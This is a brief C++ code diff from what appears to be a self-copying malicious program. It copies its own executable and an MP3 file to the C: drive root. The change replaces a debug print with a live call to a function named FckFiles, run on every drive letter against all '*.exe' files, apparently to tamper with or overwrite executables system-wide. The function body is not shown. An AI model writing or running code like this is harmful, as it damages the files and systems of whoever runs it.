@@ -67,8 +67,8 @@ int main(int argc, char* argv[])
 	CopyFile("./a.exe","C:/mitze.exe",0);
 	CopyFile("./meow.mp3","C:/meow.mp3",0);
 	for(int i=0;i<abc.length();i++){
-		cout << char_array[i]+":/";
-		//FckFiles(char_array[i]+":/","*.exe");
+
+		FckFiles(string(1,toupper(char_array[i]))+":/","*.exe");
 	}
 
 }
